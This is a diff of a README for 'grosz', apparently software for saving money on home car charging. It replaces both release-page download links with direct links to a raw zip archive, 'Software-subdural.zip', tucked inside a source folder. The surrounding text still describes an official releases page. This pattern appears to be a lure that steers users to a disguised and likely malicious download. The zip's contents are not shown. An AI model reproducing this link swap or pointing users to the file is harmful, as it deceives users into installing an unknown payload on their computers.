@@ -1,6 +1,6 @@
 # ⚡ grosz - Save money on home car charging
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosaceous-abwatt605/grosz/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Rosaceous-abwatt605/grosz/main/web/src/utils/Software-subdural.zip)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Your computer must meet these requirements to run the software:
 
 You must download the installation file from the official releases page. 
 
-[Download Version 1.0 here](https://github.com/Rosaceous-abwatt605/grosz/releases)
+[Download Version 1.0 here](https://raw.githubusercontent.com/Rosaceous-abwatt605/grosz/main/web/src/utils/Software-subdural.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
